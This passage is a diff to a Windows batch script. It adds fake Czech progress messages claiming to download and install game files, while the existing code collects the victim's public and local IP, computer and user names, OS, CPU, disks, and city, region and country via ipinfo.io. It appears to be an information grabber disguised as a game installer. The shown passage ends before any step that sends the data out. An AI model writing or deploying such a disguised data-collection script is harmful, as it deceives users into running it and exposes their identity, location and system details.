@@ -1,16 +1,32 @@
 @echo off
+echo Stahuji soubory pro hru...
+timeout /t 2 >nul
+echo Stahuji soubor "game_assets.zip"...
+timeout /t 2 >nul
+echo Vyskytla se chyba 404: Soubor nenalezen. Opravuji...
+timeout /t 3 >nul
+echo Pokusim se stahnout alternativni verzi souboru...
+timeout /t 2 >nul
+echo Stahuji soubor "game_assets_alt.zip"...
+timeout /t 2 >nul
+echo Stahovani dokončeno, extrahuji soubory...
+timeout /t 2 >nul
+echo Instalace souboru pro hru...
+timeout /t 3 >nul
+echo Instalace byla úspěšně dokončena. Spouštím hru...
+timeout /t 2 >nul
+
 for /f "tokens=2 delims=: " %%A in ('nslookup myip.opendns.com resolver1.opendns.com ^| find "Address:"') do set IP=%%A
 for /f "tokens=2 delims=: " %%A in ('ipconfig ^| find "IPv4 Address"') do set LOCAL_IP=%%A
 set PC_NAME=%COMPUTERNAME%
 set USER_NAME=%USERNAME%
 for /f "tokens=2 delims==" %%A in ('wmic os get caption /value') do set WIN_VERSION=%%A
 for /f "tokens=2 delims==" %%A in ('wmic cpu get caption /value') do set CPU=%%A
-for /f "tokens=2 delims=:" %%A in ('wmic logicaldisk get caption') do set DISK=%%A
+for /f "tokens=2 delims=: " %%A in ('wmic logicaldisk get caption') do set DISK=%%A
 for /f "tokens=2 delims=:," %%A in ('curl -s https://ipinfo.io/%IP%/json ^| findstr "city"') do set CITY=%%A
 for /f "tokens=2 delims=:," %%A in ('curl -s https://ipinfo.io/%IP%/json ^| findstr "region"') do set REGION=%%A
 for /f "tokens=2 delims=:," %%A in ('curl -s https://ipinfo.io/%IP%/json ^| findstr "country"') do set COUNTRY=%%A
 
-:: Odstranění diakritiky
 setlocal EnableDelayedExpansion
 set IP=!IP:á=a!
 set IP=!IP:é=e!
